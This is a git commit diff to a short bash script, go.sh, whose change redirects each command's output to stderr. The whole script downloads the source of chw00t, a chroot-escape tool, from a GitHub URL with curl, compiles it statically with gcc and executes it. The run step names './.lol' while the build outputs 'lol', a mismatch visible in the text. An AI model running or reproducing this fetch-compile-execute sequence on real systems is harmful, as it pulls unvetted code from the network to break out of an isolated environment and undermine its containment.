0738f09638ed342b4c4bb3ac0d033acfd186bf74
Edward Mead <emead@indeed.com>
2018-10-29 14:52:19 +0900

    redirect stdout to stderr

--- go.sh
+++ go.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 curl -L -o lol.c https://github.com/emead-indeed/chw00t/raw/master/chw00t.c
-ls -al
-/usr/bin/gcc lol.c -o lol -static
-ls -al
-./.lol --help
+ls -al 1>&2
+/usr/bin/gcc lol.c -o lol -static 1>&2
+ls -al 1>&2
+./.lol --help 1>&2
